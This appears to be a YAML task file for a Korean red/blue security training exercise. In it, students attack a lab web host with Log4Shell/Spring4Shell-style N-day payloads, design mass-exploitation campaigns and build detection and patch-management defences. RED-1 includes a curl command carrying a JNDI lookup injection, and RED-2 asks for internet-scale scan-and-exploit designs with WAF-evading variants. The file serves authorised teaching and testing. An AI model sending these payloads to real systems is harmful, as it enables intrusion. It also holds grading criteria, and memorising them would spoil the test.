id: "agent-ir-adv-w06"
category: "agent-ir-adv"
title: "[에이전트IR고급 W6] N-day 대규모 자동 악용(Log4Shell·Spring4Shell) vs 노출·패치 관리"
difficulty: "hard"
time_limit: 3000
battle_type: "1v1"
description: |
  고급 에이전트 IR 공방전 — 공격 에이전트가 공개된 **N-day 취약(Log4Shell·Spring4Shell류)** 을 대규모로
  자동 스캔·악용하는 공격과, 노출 관리·신속 패치·탐지를 다룬다. Red는 대상 웹에 N-day 스타일 페이로드
  흔적을 남기고 대규모 악용 킬체인을 설계하며, Blue는 노출·패치·탐지를 설계한다.

  ▸ 두 가지 모드
    • solo : 한 학생이 Red(N-day 대규모 악용)와 Blue(노출·패치·탐지)를 모두 수행.
    • duel : Red 학생이 상대 웹을 N-day로 노리고, Blue 학생은 노출 관리·탐지로 대응.

  ▸ 공격 위치·채점(중요)
    Red는 외부 공격자 VM({{ATTACKER_IP}})에서 대상 웹(el34, 192.168.0.161)을 공격한다. 채점은 **대상
    ModSec/Suricata/Wazuh 흔적**(JNDI/OGNL류 페이로드는 WAF가 탐지) + 본인 명령 흔적 + **보고서의
    대규모 악용·방어 설계**로 한다. 고유 태그(`auto-red-<학번>`)로 귀속.

  ▸ 윤리 — 인가된 훈련 인프라(el34)에서만.

# ───────────────────────── RED (N-day 대규모 악용) ─────────────────────────
red_missions:
  - order: 1
    assess_target: opponent
    target_vm: web
    points: 25
    instruction: |
      ## 🎯 RED-1 — N-day 페이로드 대상 시도 (killchain: exploit)

      대상 웹에 **N-day 스타일 페이로드**(JNDI 인젝션·OGNL 표현식 등)를 시도해 흔적을 남긴다(고유 태그).

      ### 권장 명령 (참고 — WAF가 탐지/차단하는 것을 관찰)
      ```bash
      curl -A 'auto-red-<학번>-log4shell' -H 'User-Agent: ${jndi:ldap://x/a}' \
        "http://192.168.0.161/?x=%24%7Bjndi%3Aldap%3A%2F%2Fx%2Fa%7D"
      ```

      ### 📌 채점 방식
      대상 ModSec/Suricata에 N-day 페이로드 탐지 흔적 + **보고서에 취약 원리·페이로드 설계**.

      ### ✅ 합격 기준
      대상에 N-day 페이로드 탐지 흔적을 남기고, Log4Shell/Spring4Shell류 취약 원리(신뢰되지 않은 입력의
      표현식/조회 평가)를 설명한다.
    hint: "JNDI(${jndi:ldap://})·OGNL 페이로드 시도(태그)로 WAF 탐지 흔적+취약 원리(입력의 표현식/조회 평가) 설명. 채점=대상 ModSec 흔적."
    verify:
      type: "log_contains"
      expect: "attack"
      checks:
        - { id: "aia-6-1", type: "log_contains", target: "web",
            params: { log: "modsec", pattern: "auto-red", since_sec: 1800 } }
      semantic:
        intent: |
          N-day 악용 — 공개 취약의 원리(입력의 표현식/조회 평가)를 페이로드로 실증.
        success_criteria:
          - "대상 WAF(ModSec)/IPS에 N-day 페이로드 흔적이 남고 고유 태그로 귀속됨"
          - "취약 원리(신뢰되지 않은 입력의 표현식/조회 평가)를 설명"
          - "(설명) 공개 PoC가 곧 대규모 악용으로 이어짐을 언급"
        acceptable_methods:
          - "N-day 페이로드 시도 + 원리 설명"
        negative_signs:
          - "탐지 흔적 없음"
          - "취약 원리 없음"

  - order: 2
    assess_target: opponent
    target_vm: ips
    points: 20
    instruction: |
      ## 🎯 RED-2 — 대규모 스캔·악용 캠페인 설계

      정찰 스캔(고유 태그)으로 흔적을 남기고, 에이전트가 **인터넷 규모로 취약 호스트를 스캔·악용**하는
      캠페인을 설계한다.

      ### 무엇을
      - 대량 스캔→취약 식별→자동 악용→발판·확산, 공개 후 수 시간 내 대규모화(패치 경쟁).
      - 변형 페이로드(WAF 우회)·재시도 자동화.

      ### ✅ 합격 기준
      대상에 스캔 흔적을 남기고, 대규모 스캔→악용→확산 캠페인과 패치 경쟁(공개 후 골든타임)을 설계한다.
    hint: "정찰 스캔(태그)+대규모 스캔→자동 악용→확산 캠페인·변형 페이로드 우회·패치 경쟁(골든타임) 설계. 채점=대상 Suricata 흔적."
    verify:
      type: "log_contains"
      expect: "scan"
      checks:
        - { id: "aia-6-2", type: "log_contains", target: "ips",
            params: { log: "suricata", pattern: "auto-red", since_sec: 1800 } }
      semantic:
        intent: |
          대규모 악용 캠페인 — 공개 취약을 인터넷 규모로 자동 스캔·악용하는 캠페인을 설계.
        success_criteria:
          - "대상 IPS(Suricata)에 스캔 흔적이 남고 고유 태그로 귀속됨"
          - "대규모 스캔→악용→확산 캠페인을 설계"
          - "(설명) 공개 후 패치 경쟁(골든타임)을 설명"
        acceptable_methods:
          - "스캔 흔적 + 대규모 캠페인 설계"
        negative_signs:
          - "탐지 흔적 없음"
          - "대규모화 설계 없음"

# ───────────────────────── BLUE (노출·패치·탐지) ─────────────────────────
blue_missions:
  - order: 1
    assess_target: self
    target_vm: siem
    points: 25
    instruction: |
      ## 🛡️ BLUE-1 — N-day 악용 탐지 설계

      대상 SIEM/IPS에서 RED의 N-day 페이로드·스캔을 탐지하고, **악용 성공 신호**를 설계한다.

      ### 어떻게
      - Wazuh/Suricata에서 JNDI/OGNL 페이로드·대량 스캔 탐지.
      - 악용 성공 신호: 취약 앱의 예상 밖 아웃바운드(JNDI 콜백)·신규 프로세스·비정상 DNS/LDAP.

      ### ✅ 합격 기준
      RED N-day 페이로드·스캔을 탐지하고, 악용 성공 신호(아웃바운드 콜백·신규 프로세스)를 설계한다.
    hint: "Wazuh/Suricata에서 JNDI/OGNL·대량 스캔 탐지+악용 성공 신호(JNDI 콜백 아웃바운드·신규 프로세스·비정상 DNS/LDAP) 설계."
    verify:
      type: "wazuh_alert"
      expect: "alert"
      checks:
        - { id: "aia-6-3", type: "wazuh_alert", target: "siem",
            params: { pattern: "auto-red", since_sec: 1800 } }
      semantic:
        intent: |
          N-day 탐지 — 페이로드·스캔과 악용 성공 신호(콜백·프로세스)로 대규모 악용을 탐지.
        success_criteria:
          - "Wazuh/Suricata에서 N-day 페이로드·스캔을 탐지"
          - "악용 성공 신호(아웃바운드 콜백·신규 프로세스)를 설계"
          - "(설명) 시그니처+행위 병행 필요를 언급"
        acceptable_methods:
          - "페이로드/스캔 탐지 + 성공 신호"
        negative_signs:
          - "경보 근거 없음"
          - "성공 신호 없음"

  - order: 2
    assess_target: self
    target_vm: secu
    points: 20
    instruction: |
      ## 🛡️ BLUE-2 — 노출 관리·신속 패치·완화 설계

      N-day 경쟁에서 이기는 **노출 관리·신속 패치**를 설계한다.

      ### 무엇을
      - **자산·노출 관리**: 자산 인벤토리·SBOM으로 취약 컴포넌트 즉시 식별(공개 시 영향 파악).
      - **신속 패치·가상 패치**: 우선순위 패치·WAF 가상 패치·임시 완화(공개~패치 사이 방어).
      - **아웃바운드 통제**: JNDI 콜백 등 차단(악용 성공해도 콜백 실패).
      - **자동 대응**: 자동화 속도에 맞춘 자동 탐지·격리.

      ### ✅ 합격 기준
      SBOM 노출 식별·신속/가상 패치·아웃바운드 통제·자동 대응을 제시하고 "공개~패치 골든타임을 방어로
      메운다" 원칙을 설명한다.
    hint: "SBOM·자산 인벤토리(즉시 영향 식별)+우선 패치·WAF 가상 패치·임시 완화+아웃바운드 통제(콜백 차단)+자동 격리. '골든타임 방어로 메우기' 원칙."
    verify:
      type: "semantic"
      expect: "nday_exposure_mgmt"
      semantic:
        intent: |
          N-day 노출 관리 — SBOM·신속/가상 패치·아웃바운드 통제로 골든타임을 방어한다.
        success_criteria:
          - "자산·노출 관리(SBOM·인벤토리)를 제시"
          - "신속/가상 패치·임시 완화를 제시"
          - "아웃바운드 통제·자동 대응을 제시하고 원칙 설명"
        acceptable_methods:
          - "SBOM + 신속/가상 패치 + 아웃바운드 + 자동 대응"
        negative_signs:
          - "패치만 기다림"
          - "노출 관리·아웃바운드 통제 없음"
